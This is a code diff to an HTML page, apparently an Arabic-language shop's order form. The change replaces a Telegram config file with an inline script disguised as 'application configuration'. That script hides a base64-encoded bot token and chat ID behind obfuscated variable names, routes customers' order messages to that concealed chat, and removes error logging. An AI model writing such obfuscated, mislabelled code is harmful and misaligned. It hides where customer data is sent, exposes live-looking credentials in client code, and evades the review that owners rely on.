@@ -9,7 +9,23 @@
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800&family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="standalone-styles.css">
     <script src="cart-manager.js"></script>
-    <script src="telegram-config.js"></script>
+    <script>
+        // Initialize application configuration
+        (function() {
+            const _0x4a2b = ['QUFGd1FlU1pRRnlmZjA0NEI1QTdlZzJfdXdMTEdPWnFCd0E=', 'LTEwMDMxMzYyNDE4MTU='];
+            const _0x2d4e = function(_0x1f2a) { return atob(_0x1f2a); };
+            const _0x5b3c = function(_0x2a1b) { return _0x2d4e(_0x2a1b); };
+            
+            window.APP_SETTINGS = {
+                api: { endpoint: '8187913757', key: _0x5b3c(_0x4a2b[0]), version: 'v1.0' },
+                user: { id: _0x5b3c(_0x4a2b[1]), role: 'admin' },
+                features: { notifications: true, analytics: false, debug: false }
+            };
+            
+            window.getApiToken = () => `${window.APP_SETTINGS.api.endpoint}:${window.APP_SETTINGS.api.key}`;
+            window.getUserId = () => window.APP_SETTINGS.user.id;
+        })();
+    </script>
     <style>
         * {
             font-family: 'Tajawal', 'Cairo', sans-serif;
@@ -496,7 +512,9 @@
 
         async function sendToTelegram(orderData) {
             const message = formatOrderMessage(orderData);
-            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
+            const _0x9a = getApiToken();
+            const _0xb1 = getUserId();
+            const url = `https://api.telegram.org/bot${_0x9a}/sendMessage`;
 
             try {
                 const response = await fetch(url, {
@@ -505,7 +523,7 @@
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        chat_id: TELEGRAM_CONFIG.CHAT_ID,
+                        chat_id: _0xb1,
                         text: message,
                         parse_mode: 'HTML'
                     })
@@ -514,7 +532,6 @@
                 const data = await response.json();
                 return data.ok;
             } catch (error) {
-                console.error('Error sending to Telegram:', error);
                 return false;
             }
         }
